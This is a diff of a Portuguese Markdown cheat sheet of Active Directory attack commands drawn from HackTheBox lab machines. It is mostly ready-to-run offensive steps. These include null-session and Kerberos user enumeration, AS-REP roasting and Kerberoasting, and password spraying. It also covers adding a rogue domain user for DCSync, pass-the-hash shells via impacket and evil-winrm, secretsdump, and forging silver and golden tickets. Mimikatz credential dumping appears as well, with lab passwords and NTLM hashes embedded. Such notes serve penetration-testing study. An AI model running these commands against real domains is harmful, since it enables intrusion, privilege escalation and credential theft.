@@ -1,124 +1,161 @@
-Resumo AD Hacking
-========================
+# Resumo AD Hacking
 
-Muitas coisas foram colocadas em prática na máquina [Forest](InfraHacking%2FCTFs%2FHackTheBox%2FForest.md#Adicionais)
+## Resumo AD Hacking
 
-[Active](InfraHacking%2FCTFs%2FHackTheBox%2FActive.md)
+Muitas coisas foram colocadas em prática na máquina [Forest](InfraHacking/CTFs/HackTheBox/Forest.md#Adicionais)
 
-# Enumeration no creds
+[Active](InfraHacking/CTFs/HackTheBox/Active.md)
 
-##  Obtem Dominio
+## Enumeration no creds
+
+### Obtem Dominio
 
 1 - Obter nome de dominio:
 
-    enum4linux -a <hostname>
-    
-    ##atenção com este comando, porque o domínio que me retornou não foi o mesmo identificado no primeiro comando.
-    
-    crackmapexec smb <ip>
-    
+```
+enum4linux -a <hostname>
 
-## Enumerate shares null session
+##atenção com este comando, porque o domínio que me retornou não foi o mesmo identificado no primeiro comando.
 
-    smbclient -U '' -N -L <ip>
-    
-    crackmapexec smb 10.10.10.179 -u '' -p '' --shares
-    
-    sudo nmap -p 445,139 -Pn -T5 10.10.10.179 --script smb-enum-shares
-    
+crackmapexec smb <ip>
+```
+
+### Enumerate shares null session
+
+```
+smbclient -U '' -N -L <ip>
+
+crackmapexec smb 10.10.10.179 -u '' -p '' --shares
+
+sudo nmap -p 445,139 -Pn -T5 10.10.10.179 --script smb-enum-shares
+```
+
 GUEST ACCESS
 
-    smbclient -U 'guest%' -N -L <ip>
-    
-    crackmapexec smb 10.10.10.179 -u '' -p '' --shares
-    
-## RPC null session
-    
-    rpcclient -N -U '' <ip>
+```
+smbclient -U 'guest%' -N -L <ip>
 
-    srvinfo
-    querydominfo
-    enumdomusers
-    enumdomgroups
-    querygroup 0x200
+crackmapexec smb 10.10.10.179 -u '' -p '' --shares
+```
 
-    netshareenum
-    netshareenumall
+### RPC null session
 
-## Enumerate LDAP
+```
+rpcclient -N -U '' <ip>
 
-    ldapsearch -x -H ldap://10.10.10.179 -s base
+srvinfo
+querydominfo
+enumdomusers
+enumdomgroups
+querygroup 0x200
 
-## Enumerate users
+netshareenum
+netshareenumall
+```
+
+### Enumerate LDAP
+
+```
+ldapsearch -x -H ldap://10.10.10.179 -s base
+```
+
+### Enumerate users
 
 Obter nome de usuário válido
 
-    kerbrute enumuser -d THM-AD --dc 10.10.221.144 usernames.txt
-    
-    enum4linux -U 10.10.10.179
-    
-    kerbrute userenum --domain oscp.exam /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 192.168.115.100
-    
-### powershell
+```
+kerbrute enumuser -d THM-AD --dc 10.10.221.144 usernames.txt
 
-#### oneliner(users)
+enum4linux -U 10.10.10.179
 
-    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Searcher.FindAll()
+kerbrute userenum --domain oscp.exam /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 192.168.115.100
+```
+
+#### powershell
+
+**oneliner(users)**
+
+```
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Searcher.FindAll()
+```
+
+**users detailed information**
+
+```
+ $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Result = $Searcher.FindAll(); Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}Write-Host "------------------------"}
+```
+
+**oneliner (grupos)**
+
+```
+ $ldapFilter = "(objectClass=Group)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties.name}
+```
+
+**oneliner (sub grupos)**
+
+```
+ $ldapFilter = "(name=LAPS_Readers)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties}
+```
+
+**Group members**
+
+```
+ $ldap_filter = "(name=LAPS_Readers)"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}
+```
+
+**Service Principal Names**
+
+```
+ $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="serviceprincipalname=*";$Result = $Searcher.FindAll();Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}}
  
-#### users detailed information
+```
 
-     $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Result = $Searcher.FindAll(); Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}Write-Host "------------------------"}
+### Kerberoasting
 
+```
+impacket-GetNPUsers -dc-ip 10.10.10.248 intelligence.htb/ -usersfile usernames.txt -format john -outputfile hashes
 
-#### oneliner (grupos)
- 
-     $ldapFilter = "(objectClass=Group)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties.name}
- 
-#### oneliner (sub grupos)
- 
-     $ldapFilter = "(name=LAPS_Readers)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties}
+ ./r.exe kerberoast /domain:timelapse.htb /dc:dc01.timelapse.htb
+```
 
-#### Group members     
-     $ldap_filter = "(name=LAPS_Readers)"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}
+## Com credencial
 
-#### Service Principal Names
-     $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="serviceprincipalname=*";$Result = $Searcher.FindAll();Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}}
-     
+### Enumerar shares
 
-## Kerberoasting
+```
+smbclient -L 10.129.245.180 -U 'balckfield.local/support' --password '#00^BlackKnight'
 
-    impacket-GetNPUsers -dc-ip 10.10.10.248 intelligence.htb/ -usersfile usernames.txt -format john -outputfile hashes
- 
-     ./r.exe kerberoast /domain:timelapse.htb /dc:dc01.timelapse.htb
-    
-# Com credencial
+enum4linux -u mhope -p '4n0therD4y@n0th3r$' 10.10.10.172
+```
 
-## Enumerar shares
+### Password spray com crackmapexec
 
-    smbclient -L 10.129.245.180 -U 'balckfield.local/support' --password '#00^BlackKnight'
+```
+crackmapexec smb 10.10.10.248 -u usernames.txt -p 'NewIntelligenceCorpUser9876'
+```
 
-    enum4linux -u mhope -p '4n0therD4y@n0th3r$' 10.10.10.172
-    
-## Password spray com crackmapexec
+### Bloodhound
 
-    crackmapexec smb 10.10.10.248 -u usernames.txt -p 'NewIntelligenceCorpUser9876'
-    
-## Bloodhound
+```
+bloodhound-python -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -v --zip -c All -dc MEGABANK.LOCAL -ns 10.10.10.172
+```
 
-    bloodhound-python -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -v --zip -c All -dc MEGABANK.LOCAL -ns 10.10.10.172
-    
-## Hashes
+### Hashes
 
-    impacket-GetNPUsers -request -format john -outputfile hashes.txt -dc-ip 10.10.10.103 'HTB.LOCAL/amanda:Ashare1972'
-    
-     ./r.exe kerberoast /domain:timelapse.htb /dc:dc01.timelapse.htb
-    
-## WinPEAS
+```
+impacket-GetNPUsers -request -format john -outputfile hashes.txt -dc-ip 10.10.10.103 'HTB.LOCAL/amanda:Ashare1972'
+
+ ./r.exe kerberoast /domain:timelapse.htb /dc:dc01.timelapse.htb
+```
+
+### WinPEAS
 
 Esse ponto aqui é interessante, poorque geralmente em domínio pode ser que as pessoas deixem salvo o as credenciais em algum arquivo, um histórico de powershell ou algo assim. Vide exemplo disso no timelapse:
 
-    ÉÍÍÍÍÍÍÍÍÍÍ¹ Found History Files
-    File: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Found History Files
+File: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
 
 ```
     type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -134,61 +171,73 @@ Esse ponto aqui é interessante, poorque geralmente em domínio pode ser que as 
     exit
 ```
 
-## DCSync
+### DCSync
 
 Aqui temos algo relevante para a gente considerar em meio aos testes. São as más configurações de grupos de access list do AD. Falhas de permissionamento dde cada grupo no qual o usuário pelo qual comprometemos a máquina faz parte.
 
 Mas nesse caso temos que olhar para, pelo menos, dois permissionamentos pertinentes pra gente escalar privilégio dentro do domínio, sendo elas:
 
-    WriteDacl
-    DCSync
- 
-No caso de WriteDacl, temos que considerar a alteração de privilégio que o usuário com essa permissão tem para fazer aos demais usuários, como na máquina [Forest](InfraHacking%2FCTFs%2FHackTheBox%2FForest.md).
+```
+WriteDacl
+DCSync
+```
+
+No caso de WriteDacl, temos que considerar a alteração de privilégio que o usuário com essa permissão tem para fazer aos demais usuários, como na máquina [Forest](InfraHacking/CTFs/HackTheBox/Forest.md).
 
 Basicamente é adicionar um usuário ao domínio no grupo "Exchange Windows Permissions" com os seguintes comandos:
 
-    net user /domain /add redteam R3dT3@m
-    net group "Exchange Windows Permissions" /add redteam
+```
+net user /domain /add redteam R3dT3@m
+net group "Exchange Windows Permissions" /add redteam
+```
 
 Precisaremos do powerview para fazer essa alteração de privilégios, porém temos duas formas, então vamos lá:
 
-### PowerView
+#### PowerView
 
-### impacket-ntlmrelayx
+#### impacket-ntlmrelayx
 
+### Try command execution
 
-## Try command execution
+```
+impacket-psexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
+impacket-smbexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
+evil-winrm -i 10.10.10.103 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267
+wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
+impacket-psexec HTB.LOCAL\amanda:Ashare1972@10.10.10.103
+impacket-smbexec HTB.LOCAL\amanda:Ashare1972@10.10.10.103
+evil-winrm -u amanda -p Ashare1972 -i 10.10.10.103
+```
 
-    impacket-psexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
-    impacket-smbexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
-    evil-winrm -i 10.10.10.103 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267
-    wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
-    impacket-psexec HTB.LOCAL\amanda:Ashare1972@10.10.10.103
-    impacket-smbexec HTB.LOCAL\amanda:Ashare1972@10.10.10.103
-    evil-winrm -u amanda -p Ashare1972 -i 10.10.10.103
+### Dump hashes (DCSync Privileges required)
 
-## Dump hashes (DCSync Privileges required)
+```
+impacket-secretsdump 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
+```
 
-    impacket-secretsdump 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
+### Generate NTLM hash
 
+```
+python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "Password".encode("utf-16le")).digest()))'
+#ou
+iconv -f ASCII -t UTF-16LE <(printf "Password") | openssl dgst -md4
+```
 
-## Generate NTLM hash
+### Domain SID
 
-    python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "Password".encode("utf-16le")).digest()))'
-    #ou
-    iconv -f ASCII -t UTF-16LE <(printf "Password") | openssl dgst -md4
-
-## Domain SID
-
-    impacket-getPac -targetUser administrator <domain>/<user>:<password>
-    #Example:
-    impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
+```
+impacket-getPac -targetUser administrator <domain>/<user>:<password>
+#Example:
+impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
+```
 
 Outra possibildade
 
-    ldapsearch -H ldaps://dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b "DC=scrm,DC=local" "(objectClass=user)"
+```
+ldapsearch -H ldaps://dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b "DC=scrm,DC=local" "(objectClass=user)"
+```
 
-![qownnotes-media-LYRNMJ](../../media/qownnotes-media-LYRNMJ.png)
+![qownnotes-media-LYRNMJ](../media/qownnotes-media-LYRNMJ.png)
 
 ```
 #!/bin/bash
@@ -234,54 +283,64 @@ done
 
 echo ${SID}
 ```
+
 Colocar esse script em um arquivo para executá-lo e passar o SID do domínio como parâmetro:
 
-    vi sid.sh
-    chmod +x sid.sh
-    ./sid.sh <DOMAIN_SID>
-    # Example:
-    ./sid.sh AQUAAAAAAAUVAAAAhQSCo0F98mxA04uXUwYAAA==
-    S-1-5-21-2743207045-1827831105-2542523200-1619
-    #Desconsiderar o -1619
-    
+```
+vi sid.sh
+chmod +x sid.sh
+./sid.sh <DOMAIN_SID>
+# Example:
+./sid.sh AQUAAAAAAAUVAAAAhQSCo0F98mxA04uXUwYAAA==
+S-1-5-21-2743207045-1827831105-2542523200-1619
+#Desconsiderar o -1619
+```
 
-
-## Generate Silver ticket
+### Generate Silver ticket
 
 Prerequisites: NTLM Hash, Domain SID e SPN
 
-    impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
-    
-    KRB5CCNAME=administrator.ccache klist
-    
-    KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
+```
+impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
+
+KRB5CCNAME=administrator.ccache klist
+
+KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
+```
 
 The output file is administrator.ccache, which is a kerberos ticket as administrator that only the MSSQL service will trust.
 
-## Kerbroasting
+### Kerbroasting
 
-    impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.205.44 -request
+```
+impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.205.44 -request
+```
 
 Assim que conseguir quebrar o hash de senha com o que resultar do comando acima, podemos considerar duas possibildades:
 
 Geração do silver ticket conforme os comandos abaixo:
 
-    impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
-    
-    KRB5CCNAME=administrator.ccache klist
-    
-    KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
-    
+```
+impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
+
+KRB5CCNAME=administrator.ccache klist
+
+KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
+```
+
 ou com mimikatz localmente na máquina:
 
-    ./m.exe
-    kerberos::purge
-    kerberos::golden /user:Administrator /domain:active.htb /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:MSSQLSvc/dc1.scrm.local:1433 /service:MSSQLSvc /rc4:<NTLM_HASH> /ptt
+```
+./m.exe
+kerberos::purge
+kerberos::golden /user:Administrator /domain:active.htb /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:MSSQLSvc/dc1.scrm.local:1433 /service:MSSQLSvc /rc4:<NTLM_HASH> /ptt
+```
 
-### mimikatz
+#### mimikatz
 
-    sekurlsa::tickets
-    sekurlsa::logonpasswords
-    sekurlsa::tickets /export
-    kerberos::list /export
-    
+```
+sekurlsa::tickets
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
+kerberos::list /export
+```
